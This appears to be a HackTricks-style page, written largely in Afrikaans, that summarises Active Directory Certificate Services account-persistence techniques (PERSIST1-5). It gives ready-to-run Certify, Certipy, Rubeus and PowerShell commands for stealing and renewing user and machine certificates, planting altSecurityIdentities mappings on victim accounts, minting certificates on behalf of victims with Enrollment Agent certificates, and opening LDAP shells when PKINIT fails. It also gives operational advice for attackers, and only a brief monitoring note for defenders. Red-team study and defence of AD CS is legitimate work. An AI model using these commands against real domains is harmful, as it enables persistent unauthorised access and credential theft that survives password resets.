# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n klein opsomming van die account persistence-hoofstukke van die uitstekende navorsing van [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verstaan Active User Credential Theft met Certificates – PERSIST1

In 'n scenario waar 'n certificate wat domain authentication toelaat deur 'n user aangevra kan word, het 'n attacker die geleentheid om hierdie certificate aan te vra en te steel om persistence op 'n network te handhaaf. By default laat die `User` template in Active Directory sulke requests toe, hoewel dit soms disabled kan wees.

Deur [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) te gebruik, kan jy search vir enabled templates wat client authentication toelaat en dan een request:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
’n Sertifikaat se krag lê in sy vermoë om te verifieer as die gebruiker aan wie dit behoort, ongeag wagwoordveranderings, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om ’n TGT te verkry:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Let wel: Gekombineer met ander tegnieke (sien THEFT-afdelings), laat sertifikaat-gebaseerde auth aanhoudende toegang toe sonder om LSASS aan te raak en selfs vanaf nie-verhoogde kontekste.

## Verkry Masjien-persistensie met Sertifikate - PERSIST2

As ’n aanvaller verhoogde voorregte op ’n host het, kan hulle die gekompromitteerde stelsel se machine account vir ’n sertifikaat inrol deur die verstek `Machine` template te gebruik. Om as die machine te authenticeren maak S4U2Self vir local services moontlik en kan duursame host-persistensie bied:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Verleng Persistensie Deur Sertifikaatvernuwing - PERSIST3

Misbruik van die geldigheids- en vernuwingstydperke van sertifikaatsjablone laat 'n aanvaller toe om langtermyn-toegang te behou. As jy in besit is van 'n voorheen uitgereikte sertifikaat en sy private sleutel, kan jy dit voor verval hernu om 'n vars, langlewende geloofsbrief te verkry sonder om bykomende versoek-artefakte te laat wat aan die oorspronklike prinsipaal gekoppel is.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operationele wenk: Volg leeftye op attacker-held PFX files en hernu vroeg. Hernuwing kan ook veroorsaak dat opgedate certificates die moderne SID mapping extension insluit, wat hulle bruikbaar hou onder strenger DC mapping rules (sien volgende afdeling).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

As jy na ’n target account se `altSecurityIdentities` attribute kan skryf, kan jy eksplisiet ’n attacker-controlled certificate na daardie account map. Dit bly oor password changes heen bestaan en, wanneer strong mapping formats gebruik word, bly dit funksioneel onder moderne DC enforcement.

Hoëvlak-flow:

1. Verkry of issue ’n client-auth certificate wat jy beheer (bv. enroll `User` template as jouself).
2. Extract ’n strong identifier uit die cert (Issuer+Serial, SKI, of SHA1-PublicKey).
3. Voeg ’n explicit mapping op die victim principal se `altSecurityIdentities` by deur daardie identifier te gebruik.
4. Authenticate met jou certificate; die DC map dit na die victim via die explicit mapping.

Voorbeeld (PowerShell) met behulp van ’n strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dan autentiseer met jou PFX. Certipy sal ’n TGT direk verkry:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Bou van Sterk `altSecurityIdentities` Mappings

In die praktyk is **Issuer+Serial** en **SKI** mappings die maklikste sterk formate om te bou vanaf ’n sertifikaat wat deur ’n aanvaller gehou word. Dit maak saak ná **11 Februarie 2025**, wanneer DCs by verstek oorskakel na **Full Enforcement** en swak mappings ophou om betroubaar te wees.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Gebruik slegs sterk mapping-tipes: `X509IssuerSerialNumber`, `X509SKI`, of `X509SHA1PublicKey`. Swak formate (Subject/Issuer, Subject-only, RFC822 email) is verouderd en kan deur DC-beleid geblokkeer word.
- Die mapping werk op beide **user**- en **computer**-objekte, so skryftoegang tot ’n computer account se `altSecurityIdentities` is genoeg om as daardie masjien te persisteer.
- Die cert chain moet bou na ’n root wat deur die DC vertrou word. Enterprise CAs in NTAuth word tipies vertrou; sommige omgewings vertrou ook public CAs.
- Schannel authentication bly nuttig vir persistence, selfs wanneer PKINIT faal omdat die DC nie die Smart Card Logon EKU het nie of `KDC_ERR_PADATA_TYPE_NOSUPP` teruggee.

#### 2025+ `Issuer/SID` explicit mappings

Op **Windows Server 2022+** domain controllers wat met die **September 9, 2025** security update gepatch is, het Microsoft nog ’n sterk explicit mapping format bygevoeg wat aantreklik is vir persistence omdat dit certificate reissuance van dieselfde CA oorleef:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operasioneel verskil dit van die ouer sterk formate:
- `Issuer+Serial` pin **een presiese sertifikaat**.
- `SKI` / `SHA1-PUKEY` pin **een sleutelpaar**.
- `Issuer/SID` pin die **uitreikende CA + teiken SID**, so hernuwe of heruitgereikte sertifikate van dieselfde CA bly werk sonder om `altSecurityIdentities` te herskryf.

Vereistes en waarskuwings
- Die sertifikaat wat vir aanmelding aangebied word, moet werklik die teikenrekening se SID in die SID security extension bevat.
- Hierdie formaat is nie nuttig vir `ESC9` / `ESC16`-styl sertifikate wat die SID extension weglaat nie; in daardie gevalle val terug op `Issuer+Serial`, `SKI`, of `SHA1-PUKEY`.

Vir meer oor weak explicit mappings en aanvalspaaie, sien:


{{#ref}}
domain-escalation.md
{{endref}}

## Enrollment Agent as Persistence – PERSIST5

As jy ’n geldige Certificate Request Agent/Enrollment Agent-sertifikaat bekom, kan jy nuwe logon-capable sertifikate namens gebruikers na willekeur uitreik en die agent PFX aflyn hou as ’n persistence-token. Misbruik-werkvloei:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Herroeping van die agent-sertifikaat of template-toestemmings is vereis om hierdie persistence uit te skakel.

Operational notes
- Moderne `Certipy` weergawes ondersteun beide `-on-behalf-of` en `-renew`, so ’n aanvaller wat ’n Enrollment Agent PFX hou, kan leaf certificates mint en later renew sonder om weer die oorspronklike teikengebruiker te raak.
- As PKINIT-gebaseerde TGT retrieval nie moontlik is nie, is die gevolglike on-behalf-of certificate steeds bruikbaar vir Schannel authentication met `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

As die DC nie ’n Smart Card Logon-capable certificate het nie, kan certificate logon via PKINIT faal met `KDC_ERR_PADATA_TYPE_NOSUPP`. Dit maak nie die persistence primitive dood nie: dieselfde PFX is dikwels steeds bruikbaar vir Schannel-authenticated LDAP access.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Dit is veral nuttig ná PERSIST4/PERSIST5 omdat jy vanaf Linux/macOS kan aanhou werk en ander directory persistence-aksies kan ketting, soos om [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) te laat val of skryfbare delegation attributes te wysig.

## 2025 Sterk Sertifikaat-mapping Handhawing: Impak op Persistence

Microsoft KB5014754 het Strong Certificate Mapping Enforcement op domain controllers ingestel. Sedert **11 Februarie 2025**, gebruik DCs by verstek **Full Enforcement** vir swak/ambigue mappings, en vanaf die **9 September 2025** security update ondersteun gepatchte DCs nie meer die ou Compatibility-mode fallback nie. Praktiese implikasies:

- Pre-2022 certificates wat nie die SID mapping extension het nie, kan implicit mapping faal wanneer DCs in Full Enforcement is. Aanvallers kan toegang behou deur óf certificates via AD CS te hernu (om die SID extension te kry) óf deur ’n sterk eksplisiete mapping in `altSecurityIdentities` te plaas (PERSIST4).
- Eksplisiete mappings wat sterk formate gebruik (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, en op moderne DCs `Issuer/SID`) werk steeds. Swak formate (Issuer/Subject, Subject-only, RFC822) kan geblokkeer word en moet vir persistence vermy word.
- As swak mappings nog steeds blyk te werk, neem aan jy het ’n ongepatchte of anders gekonfigureerde DC getref eerder as ’n betroubare langtermyn persistence-pad.
- `ESC9` / `ESC16`-styl uitreikingspaaie wat die SID extension onderdruk, maak `Issuer/SID` onbruikbaar, dus is fallback sterk mappings of hernuwing via ’n normale template die praktiese persistence-opsie.

Administrators moet monitor en waarsku oor:
- Veranderinge aan `altSecurityIdentities` en uitreiking/hernuwing van Enrollment Agent- en User certificates.
- CA-uitreikingslogs vir on-behalf-of-requests en ongewone hernuwingspatrone.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
